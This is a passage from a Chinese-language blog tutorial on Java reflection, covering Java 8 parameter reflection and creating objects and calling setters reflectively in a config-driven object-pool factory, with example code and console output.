class="line"><span class="class"><span class="title">ClassTest</span>的父类为：<span class="title">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Object</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">Process</span> <span class="title">finished</span> <span class="title">with</span> <span class="title">exit</span> <span class="title">code</span> 0</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>

<p>由此可见Class提供的功能非常丰富，值得指出的是，虽然定义ClassTest类时使用了@SuppressWarning注解，但程序运行时无法分析出该类里包含的该注解，这是因为@SuppressWarnings使用了@Retention(value=SOURCE)修饰，这表明@SuppressWarnings只能保存在源码级别上，而通过ClassTest.class获取该类运行时Class对象，所以程序无法访问到@SuppressWarnings注解。</p>
<p>通过Class对象可以得到大量的Method、Constructor、Field等对象，这些对象分别代表该类所包括的方法、构造器和成员变量等，程序还可以通过这些对象来执行实际的功能，例如调用方法、创建实例。</p>
<h3 id="3-3-Java-8-新增的方法参数反射"><a href="#3-3-Java-8-新增的方法参数反射" class="headerlink" title="3.3 Java 8 新增的方法参数反射"></a>3.3 Java 8 新增的方法参数反射</h3><p>Java 8 在java.lang.reflect包下新增了一个Executable抽象基类，该对象代表可执行的类成员，该类派生了Constructor、Method两个子类。</p>
<p>Executable基类提供了大量方法来获取修饰该方法或构造器的注解信息；还提供了<code>isVarArgs()</code>方法用于判断该方法或构造器是否包含数量可变的形参，以及通过<code>getModifiers</code>()`方法来获取该方法或构造器的修饰符。除此之外，Executable提供了如下两个方法来<strong>获取该方法或参数的形参个数及形参名</strong>。</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>int getParameterCount()</code></td>
<td align="left">获取该构造器或方法的形参个数</td>
</tr>
<tr>
<td align="left"><code>Parameter[] getParameters()</code></td>
<td align="left">获取该构造器或方法的所有形参。</td>
</tr>
</tbody></table>
<p><strong>获取参数信息：</strong></p>
<p>上面第二个方法返回了一个<code>Parameter</code>数组, <code>Parameter</code>也是<code>Java 8</code>新增的<code>API</code>,每个<code>Parameter</code>对象代表方法或构造器的一个参数。 <code>Parameter</code>也提供了大量方法来获取声明该参数的泛型信息,还提供了如下常用方法来获取参数信息。</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>getModifiers()</code></td>
<td align="left">获取修饰该形参的修饰符。</td>
</tr>
<tr>
<td align="left"><code>String getName()</code></td>
<td align="left">获取形参名</td>
</tr>
<tr>
<td align="left"><code>Type getParameterizedType()</code></td>
<td align="left">获取带泛型的形参类型。</td>
</tr>
<tr>
<td align="left"><code>Cass&lt;?&gt; getType()</code></td>
<td align="left">获取形参类型</td>
</tr>
<tr>
<td align="left"><code>boolean isNamePresent()</code></td>
<td align="left">该方法返回该类的<code>class</code>文件中是否包含了方法的形参名信息。</td>
</tr>
<tr>
<td align="left"><code>boolean isVarArgs()</code></td>
<td align="left">该方法用于判断该参数是否为个数可变的形参。</td>
</tr>
</tbody></table>
<p>需要指出的是，使用javac命令编译源文件时，默认生成的class文件并不包含方法的形参名信息，因此调用<code>isNamePresent()</code>方法将会返回false，调用<code>getName()</code>方法也不能得到该参数的形参名。如果希望javac命令编译Java源文件时可以保留形参信息，则需要为该命令指定<code>-parameters</code>选项</p>
<p>下面程序示范Java8的方法参数反射功能。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect.loader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Parameter;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">replace</span><span class="params">(String str, List&lt;String&gt; list)</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodParameterTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException </span>&#123;</span><br><span class="line">        <span class="comment">//获取Test的calss对象</span></span><br><span class="line">        Class&lt;Test&gt; clazz = Test.class;</span><br><span class="line">        <span class="comment">//获取Test类的带两个参数的replace()方法</span></span><br><span class="line">        Method replace = clazz.getMethod(<span class="string">&quot;replace&quot;</span>, String.class, List.class);</span><br><span class="line">        <span class="comment">//获取指定方法的参数个数</span></span><br><span class="line">        System.out.println(<span class="string">&quot;replace方法参数个数：&quot;</span> + replace.getParameterCount());</span><br><span class="line">        <span class="comment">//获取replace的所有参数信息</span></span><br><span class="line">        Parameter[] parameters = replace.getParameters();</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (Parameter p : parameters) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p.isNamePresent()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;---第&quot;</span> + index++ + <span class="string">&quot;个参数信息---&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;参数名：&quot;</span> + p.getName());</span><br><span class="line">                System.out.println(<span class="string">&quot;形参类型：&quot;</span> + p.getType());</span><br><span class="line">                System.out.println(<span class="string">&quot;泛型类型：&quot;</span> + p.getParameterizedType());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的程序定义了一个包含简单的Test类，该类中包含一个<code>replace(String str, List&lt;String&gt;list)</code>方法，程序中获取了该方法，接下来分别打印该方法的形参名，形参类型和泛型信息。</p>
<p>直接运行的结果为：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/bin/</span>java -javaagent:<span class="regexp">/Applications/I</span>ntelliJ IDEA.app<span class="regexp">/Contents/</span>lib<span class="regexp">/idea_rt.jar=63973:/</span>Applications<span class="regexp">/IntelliJ IDEA.app/</span>Contents<span class="regexp">/bin -Dfile.encoding=UTF-8 -classpath /</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>charsets.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/deploy.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/cldrdata.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/dnsns.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/jaccess.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/jfxrt.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/localedata.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/nashorn.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/sunec.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/sunjce_provider.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/sunpkcs11.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/zipfs.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>javaws.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/jce.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>jfr.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/jfxswt.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>jsse.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/management-agent.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>plugin.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/resources.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>rt.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span><span class="keyword">ant</span>-javafx.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>dt.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>javafx-mx.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>jconsole.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>packager.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>sa-jdi.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>tools.jar:<span class="regexp">/Users/</span>shadowflow<span class="regexp">/code/</span>java<span class="regexp">/test/</span>target<span class="regexp">/classes:/U</span>sers<span class="regexp">/shadowflow/</span>.m2<span class="regexp">/repository/</span>javassist<span class="regexp">/javassist/</span><span class="number">3.12</span>.<span class="number">1</span>.GA/javassist-<span class="number">3.12</span>.<span class="number">1</span>.GA.jar reflect.loader.MethodParameterTest</span><br><span class="line">replace方法参数个数：<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>原因是打印的值位于<code>p.isNamePresent()</code>条件为true的执行体内，也就是只有当该类的class文件中包含形参名信息时，程序才会执行条件体内的打印代码。因此需要使用如下命令来编译该程序：</p>
<figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">[shadowflow@<span class="symbol">ShadowOS</span> loader]<span class="comment">% javac -parameters -d . ./MethodParameterTest.java</span></span><br></pre></td></tr></table></figure>

<p>上面的-parameters选项用于控制javac命令保留方法形参名信息。</p>
<p>运行：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">[<span class="keyword">shadowflow@ShadowOS </span>loader]% <span class="keyword">java </span>reflect.loader.MethodParameterTest                              </span><br><span class="line">replace方法参数个数：<span class="number">2</span></span><br><span class="line">---第<span class="number">1</span>个参数信息---</span><br><span class="line">参数名：str</span><br><span class="line">形参类型：class <span class="keyword">java.lang.String</span></span><br><span class="line"><span class="keyword"></span>泛型类型：class <span class="keyword">java.lang.String</span></span><br><span class="line"><span class="keyword"></span>---第<span class="number">2</span>个参数信息---</span><br><span class="line">参数名：list</span><br><span class="line">形参类型：interface <span class="keyword">java.util.List</span></span><br><span class="line"><span class="keyword"></span>泛型类型：<span class="keyword">java.util.List&lt;java.lang.String&gt;</span></span><br><span class="line"><span class="keyword"></span>[<span class="keyword">shadowflow@ShadowOS </span>loader]% </span><br></pre></td></tr></table></figure>



<h2 id="4-使用反射生成并操作对象"><a href="#4-使用反射生成并操作对象" class="headerlink" title="4. 使用反射生成并操作对象"></a>4. 使用反射生成并操作对象</h2><p>Class对象可以获得该类里的方法（由Method对象表示）、构造器（由Constructor对象表示）、成员变量（由Field对象表示），这三个类都位于java.lang.reflect包下，并实现了java.lang.reflect.Member接口。程序可以通过Method对象来执行对应的方法，通过Constructor对象来调用对应的构造器创建实例，通过Field对象直接访问并修改对象的成员变量值。</p>
<h3 id="4-1-创建对象"><a href="#4-1-创建对象" class="headerlink" title="4.1 创建对象"></a>4.1 创建对象</h3><p>通过反射来生成对象需要先使用Class对象获取指定的Constructor对象，再调用Constructor对象的<code>newInstance()</code>方法来创建该Class对象对应的实例。通过这种方式可以选择使用指定的构造器来创建实例。</p>
<p>在很多Java EE框架中都需要根据配置文件信息来创建Java对象，从配置文件读取的只是某个类的字符串类名，程序需要根据该字符串来创建对应的实例，就必须使用反射。</p>
<p>下面的程序实现了一个简单的对象池，该对象池会根据配置文件读取key-value对，然后创建这些对象，并将这些对象放入一个HashMap中</p>
<p>ObjectPoolFactory.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectPoolFactory</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义一个对象池，前面的对象名，后面是实际对象</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Object&gt; objectPool = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个创建对象的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">createObject</span><span class="params">(String clazzName)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Class&lt;?&gt; clazz = Class.forName(clazzName);</span><br><span class="line">        <span class="keyword">return</span> clazz.getConstructor().newInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 该方法根据指定文件来初始化对象池</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initPool</span><span class="params">(String fileName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>(FileInputStream fis = <span class="keyword">new</span> FileInputStream(fileName))&#123;</span><br><span class="line">            Properties props = <span class="keyword">new</span> Properties();</span><br><span class="line">            props.load(fis);</span><br><span class="line">            <span class="keyword">for</span>(String name : props.stringPropertyNames())&#123;</span><br><span class="line">                objectPool.put(name, createObject(props.getProperty(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;读取&quot;</span> + fileName + <span class="string">&quot;异常&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> objectPool.get(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> ObjectPoolFactory pf = <span class="keyword">new</span> ObjectPoolFactory();</span><br><span class="line">        pf.initPool(<span class="string">&quot;obj.txt&quot;</span>);</span><br><span class="line">        System.out.println(pf.getObject(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">        System.out.println(pf.getObject(<span class="string">&quot;b&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的程序中<code>createObject()</code>方法里<code>Class.forName</code>根据字符串获取对应的class对象，然后用<code>newInstance()</code>方法即可创建一个Java对象。<code>initPool()</code>会读取属性文件，对属性文件中每个key-value对创建一个Java对象，其中value是该Java对象的实现类，而key是该Java对象放入对象池中的名字。为该程序提供如下属性配置文件。</p>
<p>obj.txt</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">a</span>=java.util.Date</span><br><span class="line"><span class="attr">b</span>=javax.swing.JFrame</span><br></pre></td></tr></table></figure>

<p>ObjectPoolFactory.java不写package，使用命令运行</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">[<span class="keyword">shadowflow@ShadowOS </span>reflect]% <span class="keyword">javac </span>ObjectPoolFactory.<span class="keyword">java </span>                    </span><br><span class="line">[<span class="keyword">shadowflow@ShadowOS </span>reflect]% <span class="keyword">java </span>ObjectPoolFactory                 </span><br><span class="line">Mon <span class="keyword">Jan </span><span class="number">17</span> <span class="number">10</span>:<span class="number">13</span>:<span class="number">03</span> CST <span class="number">2022</span></span><br><span class="line"><span class="keyword">javax.swing.JFrame[frame0,0,23,0x0,invalid,hidden,layout=java.awt.BorderLayout,title=,resizable,normal,defaultCloseOperation=HIDE_ON_CLOSE,rootPane=javax.swing.JRootPane[,0,0,0x0,invalid,layout=javax.swing.JRootPane$RootLayout,alignmentX=0.0,alignmentY=0.0,border=,flags=16777673,maximumSize=,minimumSize=,preferredSize=],rootPaneCheckingEnabled=true]</span></span><br><span class="line"><span class="keyword"></span></span><br></pre></td></tr></table></figure>

<p>当main函数执行到(1)方法的时候会输出时间。这表明对象池中已经有一个名为a的对象，该对象是一个java.util.Date对象。执行到(2)处的时候，将看到输出一个JFrame对象。</p>
<p>如果不想利用默认构造器来创建Java对象，而想利用指定的构造器来创建Java对象，则需要利用Constructor对象，每个Constructor对象对应一个构造器。为了利用指定的构造器来创建Java对象，需要如下三个步骤。</p>
<ol>
<li>获取该类的class对象</li>
<li>利用Class对象的<code>getConstructor()</code>方法来获取指定的构造器。</li>
<li>调用Constructor的<code>newInstance()</code>方法来创建Java对象</li>
</ol>
<p>下面的程序利用反射来创建一个JFrame对象，而且使用指定的构造器。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CreateJFrame</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取JFrame对应的Class对象</span></span><br><span class="line">        Class&lt;?&gt; jframeClazz = Class.forName(<span class="string">&quot;javax.swing.JFrame&quot;</span>);</span><br><span class="line">        <span class="comment">//获取JFrame中带一个字符串参数的构造器</span></span><br><span class="line">        Constructor ctor = jframeClazz.getConstructor(String.class);</span><br><span class="line">        <span class="comment">//调用Constructor的newInstance方法创建对象</span></span><br><span class="line">        Object obj = ctor.newInstance(<span class="string">&quot;测试窗口&quot;</span>);</span><br><span class="line">        <span class="comment">//输出JFrame对象</span></span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的程序中获取了JFrame类的指定构造器，如果要唯一的确定某类的构造器，只要指定构造器的形参列表即可。在获取构造器的时候传入一个String类型，即表明想获取只有一个字符串的参数的构造器。</p>
<p>程序中使用指定构造器的<code>newInstance()</code>方法来创建一个Java对象，当调用Constructor对象的<code>newInstance()</code>方法时通常需要传入参数，因为调用Construcot的<code>newInstance()</code>方法实际上等于调用它对应的构造器，传给<code>newInstance()</code>方法的参数将作为对应构造器的参数。</p>
<p>对于上面的程序中已知java.swing.JFrame类的情形，通常没有必要使用反射来创建该对象，毕竟通过反射创建对象的性能要稍微低一点。实际上，只有当程序需要动态创建某个类的对象时才会考虑使用反射，通常在开发通用性比较广的框架、基础平台时可能会大量使用反射。</p>
<h3 id="4-2-调用方法"><a href="#4-2-调用方法" class="headerlink" title="4.2 调用方法"></a>4.2 调用方法</h3><p>当获得某个类的class对象后，就可以通过该Class对象的<code>getMethods()</code>方法或者<code>getMethod()</code>方法来获取全部方法或者指定方法——这两个方法的返回值是Method数组，或者Method对象。</p>
<p>每个Method对象对应一个方法，获得Method对象后，程序就可以通过该Method来调用它对应的方法。在Method里包含一个<code>invoke()</code>方法，该方法的签名如下</p>
<ul>
<li>Object invoke(Object obj, Object… args): 该方法的obj是执行该方法的主调，后面的args是执行该方法时传入该方法的实参。</li>
</ul>
<p>下面的程序对前面的对象池工厂进行加强，允许在配置文件中增加配置对象的成员变量的值，对象池工厂会读取为该对象配置的成员变量值，并利用该对象对应的setter方法设置成员变量的值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.internal.util.xml.impl.Input;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExtendedObjectPoolFactory</span> </span>&#123;</span><br><span class="line">    <span class="comment">//定义一个对象池，前面是对象名，后面是实际对象</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Object&gt; objectPool = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> Properties config = <span class="keyword">new</span> Properties();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从指定属性文件中初始化Properties对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(String fileName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>(FileInputStream fis = <span class="keyword">new</span> FileInputStream(fileName)) &#123;</span><br><span class="line">            config.load(fis);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义一个创建对象的方法</span></span><br><span class="line">    <span class="comment">//该方法只传入一个字符串类名，程序可以根据该类名生成Java对象</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">createObject</span><span class="params">(String clazzName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//根据字符串来获取对应的Class对象</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(clazzName);</span><br><span class="line">        <span class="comment">//使用clazz对应类的默认构造器创建实例</span></span><br><span class="line">        <span class="keyword">return</span> clazz.getConstructor().newInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//该方法根据指定文件来初始化对象池</span></span><br><span class="line">    <span class="comment">//它会根据配置文件来创建对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initPool</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (String name : config.stringPropertyNames()) &#123;</span><br><span class="line">            <span class="comment">//每读取一个key-value对，如果key中不包含百分号（%）</span></span><br><span class="line">            <span class="comment">//这就表明是根据value来创建一个对象</span></span><br><span class="line">            <span class="comment">//调用createObject创建对象，并将对象添加到对象池中</span></span><br><span class="line">            <span class="keyword">if</span> (!name.contains(<span class="string">&quot;%&quot;</span>)) &#123;</span><br><span class="line">                objectPool.put(name, createObject(config.getProperty(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//该方法将会根据属性文件来调用指定对象的setter方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initProperty</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (String name : config.stringPropertyNames()) &#123;</span><br><span class="line">            <span class="comment">//每取出一对key-value对，如果key中包含百分号</span></span><br><span class="line">            <span class="comment">//即可认为该key用于控制调用对象的setter方法设置值</span></span><br><span class="line">            <span class="comment">//百分号前半为对象名字，后半控制stter方法名</span></span><br><span class="line">            <span class="keyword">if</span> (name.contains(<span class="string">&quot;%&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">//将配置文件的key按%分割</span></span><br><span class="line">                String[] objAndProp = name.split(<span class="string">&quot;%&quot;</span>);</span><br><span class="line">                <span class="comment">//取出调用setter方法的参数值</span></span><br><span class="line">                Object target = getObject(objAndProp[<span class="number">0</span>]);</span><br><span class="line">                <span class="comment">//获取stter方法名:set + &quot;首字母大写&quot; + 剩下部分</span></span><br><span class="line">                String mtdName = <span class="string">&quot;set&quot;</span> + objAndProp[<span class="number">1</span>].substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase() + objAndProp[<span class="number">1</span>].substring(<span class="number">1</span>);</span><br><span class="line">                <span class="comment">//通过target的getClass()获取它的实现类所对应的Class对象</span></span><br><span class="line">                Class&lt;?&gt; targetClass = target.getClass();</span><br><span class="line">                <span class="comment">//获取希望调用的stter方法</span></span><br><span class="line">                Method mtd = targetClass.getMethod(mtdName, String.class);</span><br><span class="line">                <span class="comment">//通过Method的invoke方法执行stter方法</span></span><br><span class="line">                <span class="comment">//将config.getProperty(name)的值作为调用setter方法的参数</span></span><br><span class="line">                mtd.invoke(target, config.getProperty(name));</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//从objectPool中取出指定name对应的对象</span></span><br><span class="line">        <span class="keyword">return</span> objectPool.get(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ExtendedObjectPoolFactory epf = <span class="keyword">new</span> ExtendedObjectPoolFactory();</span><br><span class="line"></span><br><span class="line">        epf.init(<span class="string">&quot;/Users/shadowflow/code/java/test/src/main/java/reflect/extObj.txt&quot;</span>);</span><br><span class="line">        epf.initPool();</span><br><span class="line">        epf.initProperty();</span><br><span class="line">        